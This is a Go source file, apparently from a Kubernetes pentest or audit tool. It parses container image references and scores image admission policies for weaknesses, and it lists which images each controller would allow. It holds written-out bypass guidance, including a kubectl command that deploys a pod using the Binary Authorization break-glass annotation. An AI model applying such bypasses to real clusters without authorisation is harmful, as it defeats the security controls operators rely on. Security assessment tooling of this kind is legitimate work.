				addImageToAnalysis(&analysis, imgInfo, seenImages)
			}
		}
	}

	analysis.UniqueImages = len(seenImages)

	// Calculate public vs private
	for _, usage := range analysis.RegistryBreakdown {
		if usage.IsPublic {
			analysis.PublicRegistryCount++
		} else {
			analysis.PrivateRegistryCount++
		}
	}

	return analysis
}

// parseImageInfo parses an image string into structured info
func parseImageInfo(image, podName, namespace, containerName string, isInit bool) ImageInfo {
	info := ImageInfo{
		FullImage:  image,
		PodName:    podName,
		Namespace:  namespace,
		Container:  containerName,
		IsInit:     isInit,
	}

	// Handle digest
	if strings.Contains(image, "@sha256:") {
		parts := strings.SplitN(image, "@", 2)
		image = parts[0]
		info.Digest = parts[1]
		info.HasDigest = true
	}

	// Handle tag
	tagIdx := strings.LastIndex(image, ":")
	if tagIdx != -1 && !strings.Contains(image[tagIdx:], "/") {
		info.Tag = image[tagIdx+1:]
		image = image[:tagIdx]
	} else {
		info.Tag = "latest" // implicit latest
		info.HasLatest = true
	}

	if info.Tag == "latest" {
		info.HasLatest = true
	}

	// Parse registry/repository
	parts := strings.SplitN(image, "/", 2)
	if len(parts) == 1 {
		// No slash = docker.io library image (e.g., "nginx")
		info.Registry = "docker.io"
		info.Repository = "library/" + parts[0]
		info.IsPublic = true
	} else if !strings.Contains(parts[0], ".") && !strings.Contains(parts[0], ":") {
		// No dot in first part = docker.io user image (e.g., "user/repo")
		info.Registry = "docker.io"
		info.Repository = image
		info.IsPublic = true
	} else {
		// Has registry prefix
		info.Registry = parts[0]
		info.Repository = parts[1]
		// Check if it's a known public registry
		_, info.IsPublic = publicRegistries[info.Registry]
	}

	return info
}

// addImageToAnalysis adds an image to the analysis
func addImageToAnalysis(analysis *ImageSourceAnalysis, img ImageInfo, seenImages map[string]bool) {
	// Track unique images
	seenImages[img.FullImage] = true

	// Track by namespace
	analysis.ImagesByNamespace[img.Namespace] = append(analysis.ImagesByNamespace[img.Namespace], img)

	// Get or create registry usage
	usage, ok := analysis.RegistryBreakdown[img.Registry]
	if !ok {
		usage = &RegistryUsage{
			Registry:     img.Registry,
			IsPublic:     img.IsPublic,
			UniqueImages: []string{},
		}
		analysis.RegistryBreakdown[img.Registry] = usage
	}

	usage.ImageCount++

	// Track unique images per registry
	imageKey := img.Registry + "/" + img.Repository
	found := false
	for _, existing := range usage.UniqueImages {
		if existing == imageKey {
			found = true
			break
		}
	}
	if !found {
		usage.UniqueImages = append(usage.UniqueImages, imageKey)
	}

	// Track namespace usage
	nsFound := false
	for _, ns := range usage.Namespaces {
		if ns == img.Namespace {
			nsFound = true
			break
		}
	}
	if !nsFound {
		usage.Namespaces = append(usage.Namespaces, img.Namespace)
	}

	// Track tag patterns
	if img.HasLatest {
		usage.LatestCount++
		analysis.LatestTagCount++
	}
	if img.Tag == "" {
		usage.NoTagCount++
		analysis.NoTagCount++
	}
	if img.HasDigest {
		usage.DigestCount++
		analysis.DigestPinnedCount++
	} else {
		analysis.ImagesWithoutDigest++
	}
}

// analyzePolicyEffectiveness analyzes how effective the image policies are
func analyzePolicyEffectiveness(
	controllers []ImageAdmissionController,
	findings []ImagePolicyFinding,
	imageAnalysis *ImageSourceAnalysis,
) PolicyEffectivenessAnalysis {
	analysis := PolicyEffectivenessAnalysis{
		PublicRegistryBlocked: make(map[string]bool),
	}

	// If no controllers detected, no blocking
	if len(controllers) == 0 {
		analysis.IsBlocking = false
		analysis.BlockingLevel = "none"
		analysis.BlockingReason = "No image admission controllers detected"
		analysis.BypassVectors = append(analysis.BypassVectors, "No admission controller - deploy any image")

		// All registries are uncovered
		for registry := range imageAnalysis.RegistryBreakdown {
			analysis.UncoveredRegistries = append(analysis.UncoveredRegistries, registry)
		}

		// All public registries are unblocked
		for registry := range publicRegistries {
			analysis.PublicRegistryBlocked[registry] = false
		}

		analysis.Recommendations = append(analysis.Recommendations,
			"Deploy an image admission controller (Sigstore, Portieris, Kyverno, Gatekeeper)",
			"Implement image signing with Cosign/Sigstore",
			"Create registry allowlist policies",
		)

		return analysis
	}

	// Check for failurePolicy=Ignore
	for _, c := range controllers {
		if c.FailurePolicy == "Ignore" {
			analysis.BypassVectors = append(analysis.BypassVectors,
				fmt.Sprintf("%s has failurePolicy=Ignore - webhook failures bypass", c.Name))
			analysis.WeakPolicies = append(analysis.WeakPolicies,
				fmt.Sprintf("%s: failurePolicy should be Fail", c.Name))
		}
	}

	// Analyze policies for coverage
	coveredPatterns := make(map[string]string) // pattern -> policy name
	allowPatterns := []string{}
	wildcardAllows := []string{}

	for _, f := range findings {
		pattern := f.Repository
		if pattern == "" || pattern == "*" {
			// Wildcard pattern
			if f.Policy == "allow" || f.SignatureReq == "No" {
				wildcardAllows = append(wildcardAllows, f.PolicyName)
				analysis.WildcardAllows = append(analysis.WildcardAllows, f.PolicyName)
				analysis.WeakPolicies = append(analysis.WeakPolicies,
					fmt.Sprintf("%s: Wildcard allow pattern", f.PolicyName))
			}
		}

		// Track covered patterns
		coveredPatterns[pattern] = f.PolicyName

		// Track allow patterns
		if f.Policy == "allow" || strings.ToLower(f.Policy) == "audit" {
			allowPatterns = append(allowPatterns, pattern)
		}

		// Check signature requirements
		if f.SignatureReq == "No" {
			analysis.UnsignedAllowed = true
		}

		// Check for warn/audit modes
		if strings.ToLower(f.Policy) == "warn" || strings.ToLower(f.Policy) == "audit" {
			analysis.WeakPolicies = append(analysis.WeakPolicies,
				fmt.Sprintf("%s: Uses %s mode (not enforcing)", f.PolicyName, f.Policy))
		}
	}

	// Check which registries are covered
	for registry, usage := range imageAnalysis.RegistryBreakdown {
		covered := false
		for pattern := range coveredPatterns {
			if matchesPattern(registry, pattern) || matchesPattern(registry+"/*", pattern) {
				covered = true
				usage.IsAllowed = true // Simplified - in reality need to check allow/deny
				usage.BlockingPolicy = coveredPatterns[pattern]
				analysis.CoveredRegistries = append(analysis.CoveredRegistries, registry)
				break
			}
		}
		if !covered {
			analysis.UncoveredRegistries = append(analysis.UncoveredRegistries, registry)
			usage.RiskLevel = "HIGH"
		}
	}

	// Check public registry blocking
	for registry, name := range publicRegistries {
		blocked := false
		for _, f := range findings {
			if matchesPattern(registry, f.Repository) {
				if f.Policy == "reject" || f.Policy == "deny" ||
				   (f.SignatureReq == "Yes" && f.Policy != "allow") {
					blocked = true
					break
				}
			}
		}
		analysis.PublicRegistryBlocked[registry] = blocked
		if !blocked && imageAnalysis.RegistryBreakdown[registry] != nil {
			analysis.BypassVectors = append(analysis.BypassVectors,
				fmt.Sprintf("Public registry %s (%s) not blocked", registry, name))
		}
	}

	// Determine blocking level
	if len(wildcardAllows) > 0 {
		analysis.BlockingLevel = "weak"
		analysis.BlockingReason = "Wildcard allow patterns detected"
	} else if len(analysis.UncoveredRegistries) > len(analysis.CoveredRegistries) {
		analysis.BlockingLevel = "partial"
		analysis.BlockingReason = fmt.Sprintf("%d registries not covered by policies", len(analysis.UncoveredRegistries))
	} else if analysis.UnsignedAllowed {
		analysis.BlockingLevel = "partial"
		analysis.BlockingReason = "Unsigned images are allowed"
	} else if len(analysis.WeakPolicies) > 0 {
		analysis.BlockingLevel = "partial"
		analysis.BlockingReason = "Weak policies detected"
	} else {
		analysis.BlockingLevel = "full"
		analysis.BlockingReason = "Image policies appear to be enforcing"
		analysis.IsBlocking = true
	}

	// Generate recommendations
	if len(analysis.UncoveredRegistries) > 0 {
		analysis.Recommendations = append(analysis.Recommendations,
			fmt.Sprintf("Add policies for uncovered registries: %s", strings.Join(analysis.UncoveredRegistries, ", ")))
	}
	if analysis.UnsignedAllowed {
		analysis.Recommendations = append(analysis.Recommendations,
			"Require image signatures for all deployments")
	}
	if len(analysis.WildcardAllows) > 0 {
		analysis.Recommendations = append(analysis.Recommendations,
			"Remove or restrict wildcard allow patterns")
	}
	if imageAnalysis.LatestTagCount > 0 {
		analysis.Recommendations = append(analysis.Recommendations,
			fmt.Sprintf("Block :latest tag (%d images using latest)", imageAnalysis.LatestTagCount))
	}
	if imageAnalysis.ImagesWithoutDigest > 0 {
		analysis.Recommendations = append(analysis.Recommendations,
			fmt.Sprintf("Require digest pinning (%d images without digest)", imageAnalysis.ImagesWithoutDigest))
	}

	return analysis
}

// extractAllowedImages extracts all allowed image patterns from detected policies
// This is useful for pentesters to identify what images can be deployed
func extractAllowedImages(
	controllers []ImageAdmissionController,
	portierisPolicies []PortierisPolicy,
	connaisseurPolicies []ConnaisseurPolicy,
	sigstorePolicies []SigstorePolicy,
	kritisPolicies []KritisPolicy,
	aquaPolicies []AquaSecurityPolicy,
	prismaPolicies []PrismaCloudPolicy,
	sysdigPolicies []SysdigSecurePolicy,
	neuvectorPolicies []NeuVectorPolicy,
	anchorePolicies []AnchorePolicy,
	azurePolicies []AzurePolicyConfig,
	clairPolicies []ClairPolicy,
	ratifyPolicies []RatifyPolicy,
	stackroxPolicies []StackRoxPolicy,
	snykPolicies []SnykContainerPolicy,
	trivyPolicies []TrivyOperatorPolicy,
	kubewardenPolicies []KubewardenPolicy,
	notationPolicies []NotationPolicy,
	harborPolicies []HarborPolicy,
	awsSignerPolicies []AWSSignerPolicy,
	wizPolicies []WizPolicy,
	laceworkPolicies []LaceworkPolicy,
	cosignPolicies []CosignStandalonePolicy,
	fluxImagePolicies []FluxImagePolicy,
	xrayPolicies []JFrogXrayPolicy,
	deepfencePolicies []DeepfencePolicy,
	qualysPolicies []QualysPolicy,
	dockerScoutPolicies []DockerScoutPolicy,
	policyEngineFindings []ImagePolicyFinding,
) []AllowedImageEntry {
	var entries []AllowedImageEntry

	// If no controllers, any image is allowed
	if len(controllers) == 0 {
		entries = append(entries, AllowedImageEntry{
			Controller:        "NONE",
			PolicyName:        "No admission controller",
			Scope:             "cluster",
			AllowedPattern:    "*",
			SignatureRequired: false,
			Conditions:        "Any image from any registry",
			DeployCommand:     "kubectl run test --image=<any-registry>/<any-image>:<any-tag>",
		})
		return entries
	}

	// Check for GCP Binary Authorization (requires special handling)
	for _, c := range controllers {
		if c.Type == "gcp-binauth" {
			// GCP Binary Authorization typically uses always_deny or require-attestation
			// Add break-glass bypass information
			entries = append(entries, AllowedImageEntry{
				Controller:        "GCP Binary Authorization",
				PolicyName:        "Break-Glass Bypass",
				Scope:             "pod",
				AllowedPattern:    "*",
				SignatureRequired: false,
				Conditions:        "BYPASS: Add break-glass annotation to pod spec",
				DeployCommand: `# Add this annotation to your pod spec to bypass Binary Authorization:
# metadata:
#   annotations:
#     alpha.image-policy.k8s.io/break-glass: "true"
#
# Example pod:
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: break-glass-pod
  annotations:
    alpha.image-policy.k8s.io/break-glass: "true"
spec:
  containers:
  - name: test
    image: ubuntu:latest
    command: ["sleep", "3600"]
EOF`,
			})

			// Also add info about attested images if Binary Auth is in attestation mode
			entries = append(entries, AllowedImageEntry{
				Controller:        "GCP Binary Authorization",
				PolicyName:        "Attested Images",
				Scope:             "cluster",
				AllowedPattern:    "Images with valid attestations",
				SignatureRequired: true,
				AttestationReq:    "GCP Binary Authorization attestor",
				Conditions:        "Requires attestation from configured attestors (check GCP console)",
				DeployCommand: `# Check attestors configured for this cluster:
gcloud container binauthz policy export

# List available attestors:
gcloud container binauthz attestors list

# Check if an image has attestations:
gcloud container binauthz attestations list --attestor=<attestor-name>`,
			})
		}
	}

	// Extract from Portieris policies
	for _, policy := range portierisPolicies {
		for _, repo := range policy.Repositories {
			if repo.Policy == "allow" || repo.Policy == "trust" {
				scope := "namespace"
				var namespaces []string
				if policy.IsClusterPolicy {
					scope = "cluster"
				} else {
					namespaces = append(namespaces, policy.Namespace)
				}

				sigReq := repo.Policy == "trust"
				conditions := ""
				if repo.Policy == "allow" {
					conditions = "No signature required"
				} else if repo.Policy == "trust" {
					conditions = "Signature required (Notary)"
				}
				if repo.VulnPolicy != "" {
					conditions += fmt.Sprintf("; Vuln policy: %s", repo.VulnPolicy)
				}

				deployCmd := fmt.Sprintf("kubectl run test --image=%s/your-image:tag", repo.Name)
				if repo.Name == "*" {
					deployCmd = "kubectl run test --image=<any-registry>/<any-image>:tag"
				}

				entries = append(entries, AllowedImageEntry{
					Controller:        "Portieris",
					PolicyName:        policy.Name,
					Scope:             scope,
					Namespaces:        namespaces,
					AllowedPattern:    repo.Name,
					SignatureRequired: sigReq,
					Conditions:        conditions,
					DeployCommand:     deployCmd,
				})
			}
		}
	}

	// Extract from Connaisseur policies
	for _, policy := range connaisseurPolicies {
		if policy.Rule == "allow" || policy.Rule == "validate" {
			sigReq := policy.Rule == "validate"
			conditions := ""
			if policy.Rule == "allow" {
				conditions = "No signature required"
			} else {
				conditions = fmt.Sprintf("Signature required (validators: %s)", strings.Join(policy.Validators, ", "))
			}

			deployCmd := fmt.Sprintf("kubectl run test --image=%s", policy.Pattern)
			if policy.Pattern == "*" {
				deployCmd = "kubectl run test --image=<any-image>"
			}

			entries = append(entries, AllowedImageEntry{
				Controller:        "Connaisseur",
				PolicyName:        policy.Name,
				Scope:             "cluster",
				AllowedPattern:    policy.Pattern,
				SignatureRequired: sigReq,
				Conditions:        conditions,
				DeployCommand:     deployCmd,
			})
		}
	}

	// Extract from Sigstore policies
	for _, policy := range sigstorePolicies {
		for _, img := range policy.Images {
			conditions := "Signature required (Cosign/Sigstore)"
			if policy.KeylessEnabled {
				conditions += "; Keyless allowed"
			}
			if len(policy.KeyRefs) > 0 {
				conditions += fmt.Sprintf("; Keys: %s", strings.Join(policy.KeyRefs, ", "))
			}
			if policy.AttestationsEnabled {
				conditions += fmt.Sprintf("; Attestations: %s", strings.Join(policy.AttestationTypes, ", "))
			}
			if policy.Mode == "warn" {
				conditions += "; WARN MODE (not enforced)"
			}

			deployCmd := fmt.Sprintf("kubectl run test --image=%s", img)
			if strings.Contains(img, "*") {
				deployCmd = fmt.Sprintf("# Pattern: %s\nkubectl run test --image=<matching-image>", img)
			}

			entries = append(entries, AllowedImageEntry{
				Controller:        "Sigstore",
				PolicyName:        policy.Name,
				Scope:             "cluster",
				AllowedPattern:    img,
				SignatureRequired: true,
				AttestationReq:    strings.Join(policy.AttestationTypes, ", "),
				Conditions:        conditions,
				DeployCommand:     deployCmd,
			})
		}
	}

	// Extract from Kritis policies
	for _, policy := range kritisPolicies {
		conditions := "Attestation required"
		if policy.DefaultAllow {
			conditions = "Default ALLOW - images without attestation are allowed"
		}
		if len(policy.RequiredAttestors) > 0 {
			conditions += fmt.Sprintf("; Attestors: %s", strings.Join(policy.RequiredAttestors, ", "))
		}

		entries = append(entries, AllowedImageEntry{
			Controller:        "Kritis",
			PolicyName:        policy.Name,
			Scope:             "namespace",
			Namespaces:        []string{policy.Namespace},
			AllowedPattern:    "*",
			SignatureRequired: !policy.DefaultAllow,
			AttestationReq:    strings.Join(policy.RequiredAttestors, ", "),
			Conditions:        conditions,
			DeployCommand:     fmt.Sprintf("kubectl run test --image=<attested-image> -n %s", policy.Namespace),
		})
	}

	// Extract from Aqua Security policies
	for _, policy := range aquaPolicies {
		if len(policy.AllowedRegistries) > 0 {
			for _, registry := range policy.AllowedRegistries {
				conditions := "Allowed registry"
				if policy.BlockUnregistered {
					conditions += "; Unregistered images blocked"
				}
				if policy.CVSSThreshold > 0 {
					conditions += fmt.Sprintf("; Max CVSS: %.1f", policy.CVSSThreshold)
				}

				entries = append(entries, AllowedImageEntry{
					Controller:        "Aqua Security",
					PolicyName:        policy.Name,
					Scope:             "cluster",
					AllowedPattern:    registry + "/*",
					SignatureRequired: false,
					Conditions:        conditions,
					DeployCommand:     fmt.Sprintf("kubectl run test --image=%s/your-image:tag", registry),
				})
			}
		}
	}

	// Extract from Prisma Cloud policies
	for _, policy := range prismaPolicies {
		if len(policy.TrustedRegistries) > 0 {
			for _, registry := range policy.TrustedRegistries {
				conditions := "Trusted registry"
				if policy.BlockThreshold != "" {
					conditions += fmt.Sprintf("; Block threshold: %s", policy.BlockThreshold)
				}
				if policy.GracePeriodDays > 0 {
					conditions += fmt.Sprintf("; Grace period: %d days", policy.GracePeriodDays)
				}

				entries = append(entries, AllowedImageEntry{
					Controller:        "Prisma Cloud",
					PolicyName:        policy.Name,
					Scope:             "cluster",
					AllowedPattern:    registry + "/*",
					SignatureRequired: false,
					Conditions:        conditions,
					DeployCommand:     fmt.Sprintf("kubectl run test --image=%s/your-image:tag", registry),
				})
			}
		}
	}

	// Extract from Sysdig Secure policies
	for _, policy := range sysdigPolicies {
		if len(policy.AllowedRegistries) > 0 {
			for _, registry := range policy.AllowedRegistries {
				conditions := "Allowed registry"
				if policy.CVSSThreshold > 0 {
					conditions += fmt.Sprintf("; Max CVSS: %.1f", policy.CVSSThreshold)
				}
				if policy.BlockOnFailure {
					conditions += "; Blocks on scan failure"
				}

				entries = append(entries, AllowedImageEntry{
					Controller:        "Sysdig Secure",
					PolicyName:        policy.Name,
					Scope:             "cluster",
					AllowedPattern:    registry + "/*",
					SignatureRequired: false,
					Conditions:        conditions,
					DeployCommand:     fmt.Sprintf("kubectl run test --image=%s/your-image:tag", registry),
				})
			}
		}
	}

	// Extract from NeuVector policies
	for _, policy := range neuvectorPolicies {
		if len(policy.AllowedRegistries) > 0 {
			for _, registry := range policy.AllowedRegistries {
				conditions := fmt.Sprintf("Mode: %s", policy.Mode)
				if policy.BlockHighCVE {
					conditions += "; Blocks high CVE"
				}

				entries = append(entries, AllowedImageEntry{
					Controller:        "NeuVector",
					PolicyName:        policy.Name,
					Scope:             "cluster",
					AllowedPattern:    registry + "/*",
					SignatureRequired: false,
					Conditions:        conditions,
					DeployCommand:     fmt.Sprintf("kubectl run test --image=%s/your-image:tag", registry),
				})
			}
		}
		// Also note denied registries
		if len(policy.DeniedRegistries) > 0 {
			entries = append(entries, AllowedImageEntry{
				Controller:        "NeuVector",
				PolicyName:        policy.Name + " (DENY)",
				Scope:             "cluster",
				AllowedPattern:    "[DENIED: " + strings.Join(policy.DeniedRegistries, ", ") + "]",
				SignatureRequired: false,
				Conditions:        "BLOCKED registries - cannot deploy from these",
				DeployCommand:     "# These registries are BLOCKED",
			})
		}
	}

	// Extract from Anchore policies
	for _, policy := range anchorePolicies {
		if len(policy.AllowedRegistries) > 0 {
			for _, registry := range policy.AllowedRegistries {
				conditions := fmt.Sprintf("Mode: %s", policy.Mode)
				if policy.FailOnPolicyEval {
					conditions += "; Fails on policy evaluation"
				}

				entries = append(entries, AllowedImageEntry{
					Controller:        "Anchore",
					PolicyName:        policy.Name,
					Scope:             "cluster",
					AllowedPattern:    registry + "/*",
					SignatureRequired: false,
					Conditions:        conditions,
					DeployCommand:     fmt.Sprintf("kubectl run test --image=%s/your-image:tag", registry),
				})
			}
		}
	}

	// Extract from Azure Policy configs
	for _, policy := range azurePolicies {
		if len(policy.AllowedRegistries) > 0 {
			for _, registry := range policy.AllowedRegistries {
				conditions := "Azure Policy allowed registry"
				if policy.RequireDigest {
					conditions += "; Digest required"
				}
				if policy.ACROnly {
					conditions += "; ACR only"
				}

				entries = append(entries, AllowedImageEntry{
					Controller:        "Azure Policy",
					PolicyName:        policy.Name,
					Scope:             "cluster",
					AllowedPattern:    registry + "/*",
					SignatureRequired: false,
					Conditions:        conditions,
					DeployCommand:     fmt.Sprintf("kubectl run test --image=%s/your-image:tag", registry),
				})
			}
		}
	}

	// Extract from Clair policies
	for _, policy := range clairPolicies {
		if len(policy.AllowList) > 0 {
			for _, pattern := range policy.AllowList {
				conditions := "Clair allowlist"
				if policy.SeverityThreshold != "" {
					conditions += fmt.Sprintf("; Max severity: %s", policy.SeverityThreshold)
				}
				if policy.FixableOnly {
					conditions += "; Fixable vulns only"
				}

				entries = append(entries, AllowedImageEntry{
					Controller:        "Clair",
					PolicyName:        policy.Name,
					Scope:             "cluster",
					AllowedPattern:    pattern,
					SignatureRequired: false,
					Conditions:        conditions,
					DeployCommand:     fmt.Sprintf("kubectl run test --image=%s", pattern),
				})
			}
		}
	}

	// Extract from Ratify policies
	for _, policy := range ratifyPolicies {
		scope := "cluster"
		var namespaces []string
		if policy.Namespace != "" {
			scope = "namespace"
			namespaces = append(namespaces, policy.Namespace)
		}

		conditions := "Signature verification required (Ratify)"
		if len(policy.Verifiers) > 0 {
			conditions += fmt.Sprintf("; Verifiers: %s", strings.Join(policy.Verifiers, ", "))
		}
		if len(policy.ArtifactTypes) > 0 {
			conditions += fmt.Sprintf("; Artifact types: %s", strings.Join(policy.ArtifactTypes, ", "))
		}

		entries = append(entries, AllowedImageEntry{
			Controller:        "Ratify",
			PolicyName:        policy.Name,
			Scope:             scope,
			Namespaces:        namespaces,
			AllowedPattern:    "Images with valid signatures",
			SignatureRequired: true,
			AttestationReq:    strings.Join(policy.ArtifactTypes, ", "),
			Conditions:        conditions,
			DeployCommand:     "# Requires image with valid Ratify-verified signature\nkubectl run test --image=<signed-image>",
		})
	}

	// Extract from StackRox policies
	for _, policy := range stackroxPolicies {
		if !policy.Enabled {
			continue
		}

		conditions := fmt.Sprintf("Enforcement: %s", policy.EnforcementAction)
		if policy.Severity != "" {
			conditions += fmt.Sprintf("; Severity: %s", policy.Severity)
		}
		if len(policy.Categories) > 0 {
			conditions += fmt.Sprintf("; Categories: %s", strings.Join(policy.Categories, ", "))
		}

		// StackRox can have image criteria that define what's blocked
		pattern := "Images passing StackRox policy"
		if len(policy.ImageCriteria) > 0 {
			pattern = fmt.Sprintf("NOT matching: %s", strings.Join(policy.ImageCriteria, ", "))
		}

		entries = append(entries, AllowedImageEntry{
			Controller:        "StackRox/RHACS",
			PolicyName:        policy.Name,
			Scope:             "cluster",
			AllowedPattern:    pattern,
			SignatureRequired: false,
			Conditions:        conditions,
			DeployCommand:     "# Image must pass StackRox policy evaluation\nkubectl run test --image=<compliant-image>",
		})
	}

	// Extract from Snyk policies
	for _, policy := range snykPolicies {
		if !policy.Enabled {
			continue
		}

		conditions := fmt.Sprintf("Severity threshold: %s", policy.SeverityThreshold)
		if policy.BlockOnFailure {
			conditions += "; Blocks on scan failure"
		}
		if policy.AutoFix {
			conditions += "; Auto-fix enabled"
		}

		pattern := "Images passing Snyk scan"
		if len(policy.MonitoredProjects) > 0 {
			pattern = fmt.Sprintf("Projects: %s", strings.Join(policy.MonitoredProjects, ", "))
		}

		entries = append(entries, AllowedImageEntry{
			Controller:        "Snyk Container",
			PolicyName:        policy.Name,
			Scope:             "cluster",
			AllowedPattern:    pattern,
			SignatureRequired: false,
			Conditions:        conditions,
			DeployCommand:     "# Image must pass Snyk vulnerability scan\nkubectl run test --image=<scanned-image>",
		})
	}

	// Extract from Trivy Operator policies
	for _, policy := range trivyPolicies {
		scope := "cluster"
		var namespaces []string
		if policy.Namespace != "" {
			scope = "namespace"
			namespaces = append(namespaces, policy.Namespace)
		}

		conditions := "Trivy Operator scanning"
		if policy.SeverityThreshold != "" {
			conditions += fmt.Sprintf("; Max severity: %s", policy.SeverityThreshold)
		}
		if policy.SBOMEnabled {
			conditions += "; SBOM enabled"
		}
		if policy.VulnerabilityReports {
			conditions += "; Vuln reports"
		}

		// Trivy typically scans but doesn't block unless integrated with admission
		entries = append(entries, AllowedImageEntry{
			Controller:        "Trivy Operator",
			PolicyName:        policy.Name,
			Scope:             scope,
			Namespaces:        namespaces,
			AllowedPattern:    "Images passing Trivy scan",
			SignatureRequired: false,
			Conditions:        conditions,
			DeployCommand:     "# Check Trivy scan results for image compliance\nkubectl run test --image=<scanned-image>",
		})
	}

	// Extract from Kubewarden policies
	for _, policy := range kubewardenPolicies {
		scope := "cluster"
		var namespaces []string
		if !policy.IsClusterWide {
			scope = "namespace"
			if policy.Namespace != "" {
				namespaces = append(namespaces, policy.Namespace)
			}
		}

		conditions := fmt.Sprintf("Mode: %s", policy.Mode)
		if policy.Mutating {
			conditions += "; Mutating"
		}
		if policy.Module != "" {
			// Extract module name from URL
			moduleName := policy.Module
			if strings.Contains(moduleName, "/") {
				parts := strings.Split(moduleName, "/")
				moduleName = parts[len(parts)-1]
			}
			conditions += fmt.Sprintf("; Module: %s", moduleName)
		}

		pattern := "Images passing Kubewarden policy"
		if len(policy.Rules) > 0 {
			pattern = fmt.Sprintf("Rules: %s", strings.Join(policy.Rules, ", "))
		}

		entries = append(entries, AllowedImageEntry{
			Controller:        "Kubewarden",
			PolicyName:        policy.Name,
			Scope:             scope,
			Namespaces:        namespaces,
			AllowedPattern:    pattern,
			SignatureRequired: false,
			Conditions:        conditions,
			DeployCommand:     "# Image must pass Kubewarden policy\nkubectl run test --image=<compliant-image>",
		})
	}

	// Extract from Notation policies
	for _, policy := range notationPolicies {
		if !policy.Enabled {
			continue
		}

		conditions := "Notation signature verification required"
		if policy.VerificationLevel != "" {
			conditions += fmt.Sprintf("; Level: %s", policy.VerificationLevel)
		}
		if policy.SignatureFormat != "" {
			conditions += fmt.Sprintf("; Format: %s", policy.SignatureFormat)
		}
		if len(policy.TrustStores) > 0 {
			conditions += fmt.Sprintf("; Trust stores: %s", strings.Join(policy.TrustStores, ", "))
		}

		entries = append(entries, AllowedImageEntry{
			Controller:        "Notation/Notary v2",
			PolicyName:        policy.Name,
			Scope:             "cluster",
			AllowedPattern:    "Images with valid Notation signatures",
			SignatureRequired: true,
			AttestationReq:    policy.TrustPolicyName,
			Conditions:        conditions,
			DeployCommand:     "# Requires image signed with Notation\nkubectl run test --image=<notation-signed-image>",
		})
	}

	// Extract from Harbor policies
	for _, policy := range harborPolicies {
		if !policy.Enabled {
			continue
		}

		conditions := "Harbor registry policy"
		if policy.PreventVulnImages {
			conditions += "; Blocks vulnerable images"
		}
		if policy.SeverityThreshold != "" {
			conditions += fmt.Sprintf("; Max severity: %s", policy.SeverityThreshold)
		}
		sigReq := false
		if policy.ContentTrustEnabled {
			conditions += "; Content trust required"
			sigReq = true
		}
		if policy.CosignEnabled {
			conditions += "; Cosign enabled"
			sigReq = true
		}
		if policy.AutoScan {
			conditions += "; Auto-scan on push"
		}

		entries = append(entries, AllowedImageEntry{
			Controller:        "Harbor",
			PolicyName:        policy.Name,
			Scope:             "cluster",
			AllowedPattern:    "Images from Harbor meeting policy",
			SignatureRequired: sigReq,
			Conditions:        conditions,
			DeployCommand:     "# Use images from Harbor that meet policy requirements\nkubectl run test --image=<harbor-registry>/project/image:tag",
		})
	}

	// Extract from AWS Signer policies
	for _, policy := range awsSignerPolicies {
		if !policy.Enabled {
			continue
		}

		conditions := "AWS Signer verification"
		sigReq := !policy.AllowUnsigned
		if policy.AllowUnsigned {
			conditions += "; UNSIGNED ALLOWED (weak policy)"
		} else {
			conditions += "; Signature required"
		}
		if policy.SigningProfileARN != "" {
			// Extract profile name from ARN
			profileName := policy.SigningProfileARN
			if strings.Contains(profileName, "/") {
				parts := strings.Split(profileName, "/")
				profileName = parts[len(parts)-1]
			}
			conditions += fmt.Sprintf("; Profile: %s", profileName)
		}
		if policy.PlatformID != "" {
			conditions += fmt.Sprintf("; Platform: %s", policy.PlatformID)
		}

		pattern := "AWS Signer signed images"
		if policy.AllowUnsigned {
			pattern = "ANY (unsigned allowed)"
		}

		entries = append(entries, AllowedImageEntry{
			Controller:        "AWS Signer",
			PolicyName:        policy.Name,
			Scope:             "cluster",
			AllowedPattern:    pattern,
			SignatureRequired: sigReq,
			AttestationReq:    policy.SigningProfileARN,
			Conditions:        conditions,
			DeployCommand:     "# Use images signed with AWS Signer\nkubectl run test --image=<ecr-repo>/<image>@sha256:<digest>",
		})
	}

	// Extract from policy engine findings (Kyverno, Gatekeeper)
	for _, f := range policyEngineFindings {
		if f.Policy == "allow" || strings.ToLower(f.Policy) == "audit" || f.Repository != "" {
			conditions := fmt.Sprintf("Policy action: %s", f.Policy)
			if f.BypassRisk != "" {
				conditions += fmt.Sprintf("; %s", f.BypassRisk)
			}
			if f.SignatureReq == "Yes" {
				conditions += "; Signature required"
			}

			pattern := f.Repository
			if pattern == "" {
				pattern = "*"
			}

			scope := strings.ToLower(f.Scope)
			var namespaces []string
			if f.Namespace != "" {
				namespaces = append(namespaces, f.Namespace)
			}

			entries = append(entries, AllowedImageEntry{
				Controller:        f.Controller,
				PolicyName:        f.PolicyName,
				Scope:             scope,
				Namespaces:        namespaces,
				AllowedPattern:    pattern,
				SignatureRequired: f.SignatureReq == "Yes",
				Conditions:        conditions,
				DeployCommand:     fmt.Sprintf("# Pattern: %s", pattern),
			})
		}
	}

	return entries
}

// webhookTargetsWorkloads checks if a webhook targets pods, deployments, or other workload resources
func webhookTargetsWorkloads(whObject map[string]interface{}) bool {
	webhooks, ok := whObject["webhooks"].([]interface{})
	if !ok || len(webhooks) == 0 {
		return false
	}

	workloadResources := map[string]bool{
		"pods":         true,
		"deployments":  true,
		"replicasets":  true,
		"statefulsets": true,
		"daemonsets":   true,
		"jobs":         true,
		"cronjobs":     true,
		"*":            true, // wildcard matches all
	}

	for _, wh := range webhooks {
		whMap, ok := wh.(map[string]interface{})
		if !ok {
			continue
		}

		rules, ok := whMap["rules"].([]interface{})
		if !ok {
			continue
		}

		for _, rule := range rules {
			ruleMap, ok := rule.(map[string]interface{})
			if !ok {
				continue
			}

			resources, ok := ruleMap["resources"].([]interface{})
			if !ok {
				continue
			}

			for _, res := range resources {
				if resStr, ok := res.(string); ok {
					if workloadResources[strings.ToLower(resStr)] {
						return true
					}
				}
			}
		}
	}

	return false
}

// verifyPodsRunning checks if pods are running in the specified namespaces
func verifyPodsRunning(ctx context.Context, clientset kubernetes.Interface, namespaces []string, labelSelector string) (bool, string) {
	for _, ns := range namespaces {
		opts := metav1.ListOptions{}
		if labelSelector != "" {
			opts.LabelSelector = labelSelector
		}
		pods, err := clientset.CoreV1().Pods(ns).List(ctx, opts)
		if err == nil && len(pods.Items) > 0 {
			for _, pod := range pods.Items {
				if pod.Status.Phase == "Running" {
					return true, ns
				}
			}
		}
	}
	return false, ""
}

